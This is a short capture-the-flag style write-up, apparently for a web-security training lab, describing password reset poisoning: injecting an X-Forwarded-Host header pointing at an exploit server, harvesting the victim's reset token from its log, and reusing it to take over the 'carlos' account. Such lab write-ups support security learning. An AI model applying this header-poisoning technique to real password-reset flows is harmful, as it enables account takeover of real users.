@@ -1,0 +1,28 @@
+Vulnerable - Password reset poisoning via middleware
+
+Goal: Login as the user carlos
+
+Given information:
+My credentials: username: wiener , password: peter
+
+Victim username: carlos
+
+Analysis:
+--------
+
+My exploit server url: https://exploit-0a4800ec04181bfbc0c2518901400024.web-security-academy.net/
+
+X-Forwarded-Host header is supported
+
+The request -> POST /forgot-password HTTP/1.1
+add this to the request-> X-Forwarded-Host: My expolit server url without https://
+set username -> carlos
+
+After that go to your exploit server then access log  you should find a GET /forgot-password request with the victim token copy that token
+
+Victim token: ncJefjXCmh3nGGog9Nm6HJ9cVjCHIDAI
+
+Now go to your client emali click on the link and before you send the request
+-> set the temp-forgot-password-token to the Victim token
+
+Solved
